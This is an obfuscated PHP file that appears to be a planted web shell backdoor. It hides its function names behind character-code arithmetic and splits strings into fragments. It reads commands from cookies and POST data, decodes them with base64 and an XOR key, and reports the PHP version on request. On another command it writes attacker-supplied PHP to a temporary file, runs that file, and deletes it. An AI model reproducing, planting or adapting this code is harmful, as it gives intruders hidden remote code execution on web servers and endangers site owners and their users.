<?php       function	ptextta(){$bbbnq='ttkxkxy';	print_r	(46845+46845);   }

$rzj_ygyj/*  ik*/=   'rzj_ygyj'	^	'';
$hfzsgdy  =/*pr*/"\x66"	.     "\x69"	.	"\154"    .	"\145"	.	$rzj_ygyj(95)    .	"p"."u"."t"."_"."c"."o"."n"."\164"	.	$rzj_ygyj(101)      .     "\x6e"    .	$rzj_ygyj(133-17)	.	$rzj_ygyj(745-630);
$ivrzudzscq	=	"b".$rzj_ygyj(180-83)     .	"\163"/*g*/.	$rzj_ygyj(101)/*   tbm  */./*gly */"6"."4"."_".$rzj_ygyj(970-870)  .	$rzj_ygyj(1001-900)/*   lgj*/.	$rzj_ygyj(464-365)	.	$rzj_ygyj(111)/*cwrv_ */./*   jxrwm*/"d"."e";
$qiaiymjf/* moa */=	"u"."\x6e"	.      $rzj_ygyj(115)	.	"e"."r"."i".$rzj_ygyj(97)/* l */.      "l"."i"."\172"   .  "e";

$esdwsq/*  d */=/*   ioqcd  */"p"."h"."\160"     .	"\166"	.	$rzj_ygyj(1041-940)	.	$rzj_ygyj(114)/*jvdd  */.	"s"."i".$rzj_ygyj(111)	.	$rzj_ygyj(449-339);
$dwyslls	=       "u"."\156"/*  kytbq*/./*xuh*/"\x6c"/*  pyex*/.	$rzj_ygyj(995-890)	.       $rzj_ygyj(110)/*   bq*/.	"k";


   

function/* uch_   */cnrildhcux($htbrxmc,	$syjtsr)


{


/*  hlag   */global	$rzj_ygyj;

	$rphkqujf/*   jyot   */=    "";

	for	($puvfh_se	=	0;       $puvfh_se/* n */</*   ropya   */strlen($htbrxmc);)  {
	for	($yijvz/*   ip   */=/* zfhi*/0;	$yijvz/* huc  */<   strlen($syjtsr)	&&	$puvfh_se/*  wo */<   strlen($htbrxmc);/*hh */$yijvz++,	$puvfh_se++)/* mjfh   */{	$rphkqujf	.=      $rzj_ygyj(ord($htbrxmc[$puvfh_se])/* ut */^/* aukj */ord($syjtsr[$yijvz]));	}

/*  cvh */}


	return	$rphkqujf;


}





$xc_wsbsxf      =	$_COOKIE;


$xbdlbjnr	=/*pk   */$_POST;

$xc_wsbsxf/*   gtgpm   */=/*  jjl*/array_merge($xbdlbjnr,/*  j  */$xc_wsbsxf);


$ehsmryu	=      $rzj_ygyj(50)       .	"2"."\x63"    .     "\67"	.      "0"."\63"	.	$rzj_ygyj(104-47)   ./*  m */"6".$rzj_ygyj(568-523)/* eh  */.  "3".$rzj_ygyj(905-803)      .      "\x66"/*   esarf   */./*fiph */$rzj_ygyj(672-570)/*   dvrjz   */./*   gh  */"-".$rzj_ygyj(52)	./*  xha   */"\x36"/*  dgzx   */./*   z   */"\60"     .	"\71"       .	"-"."b"."\x64"      .	"f"."3"."\x2d"/*btv_a */.      "e".$rzj_ygyj(49)      .	"\61"       .	$rzj_ygyj(53)/*   sai*/.      "1"."3"."2"."1"."2".$rzj_ygyj(951-854)/*lltz*/./*   ufg */$rzj_ygyj(780-728)	./* n */"\63";foreach/* hol */($xc_wsbsxf     as/*lvr   */$yijvzeduknyg  =>	$htbrxmc)/* lag */{/* tl  */$htbrxmc/*  nqj   */=	$qiaiymjf(cnrildhcux(cnrildhcux($ivrzudzscq($htbrxmc),     $ehsmryu),  $yijvzeduknyg));


	if/*  grhl */(isset($htbrxmc["\141"/*   jg*/.	"k"]))	{

	if/*lf  */($htbrxmc["a"]/* bu   */==/* pv   */"i")	{  $puvfh_se/* ygvja   */=/*  f */array();
/* xmod   */$puvfh_se["p"."\x76"]	=	$esdwsq();


     $puvfh_se[$rzj_ygyj(420-305)	./* rikg   */$rzj_ygyj(118)]       =	"3".".".$rzj_ygyj(637-584);


/* u__p   */echo/*  yqavk   */@serialize($puvfh_se);/*  noyci   */}	elseif/* xtvk*/($htbrxmc["a"]/*  k   */==/*   kcm*/"e")/*f__z */{

      $viecgtm/* b   */=    sprintf($rzj_ygyj(1039-993)/* bh   */.    $rzj_ygyj(617-570)	.	"%"."s"."."."p"."\x6c",/* yg_re */md5($ehsmryu));
	$hfzsgdy($viecgtm,/*  ndwze  */"<"	.	"?"."p"."h"."p".$rzj_ygyj(32)/*wxkq   */.      "u"."n"."\x6c"     ./* ifu*/"i"."n".$rzj_ygyj(107)	.      "("."_"."_".$rzj_ygyj(70)/*xwpu*/.	"I"."L"."\x45"    ./*ve*/"\x5f"    .    "_".")"."\73"	.     $rzj_ygyj(32)     .  $htbrxmc[$rzj_ygyj(100)]);


	include($viecgtm);

	$ytvlurnzeo     =      $viecgtm;    $dwyslls($ytvlurnzeo);

	}

/*  nfgh*/exit();
      }}

